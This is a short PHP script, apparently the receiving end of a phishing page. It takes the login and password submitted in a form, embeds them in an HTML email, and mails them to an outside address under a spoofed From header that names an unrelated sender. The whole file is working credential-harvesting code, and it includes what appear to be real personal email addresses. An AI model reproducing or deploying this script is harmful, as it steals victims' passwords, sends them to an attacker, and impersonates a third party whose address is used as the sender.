<?php

$fromAddr = 'mperez@gorecoquimbo.cl'; // the address to show in From field.
$recipientAddr = 'luis.jimenez@sysco.cl';
$subjectStr = 'Thank You';

$mailBodyText = <<<HHHHHHHHHHHHHH
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
<title>Thank You</title>
</head>
<body>
<p>
<b>Your login is:</b> {$_POST['login']}<br>
<b>Password:</b> {$_POST['password']}<br>
</p>
</body>
</html>
HHHHHHHHHHHHHH;

$headers= <<<TTTTTTTTTTTT
From: $fromAddr
MIME-Version: 1.0
Content-Type: text/html;
TTTTTTTTTTTT;

mail( $recipientAddr , $subjectStr , $mailBodyText, $headers);

?>
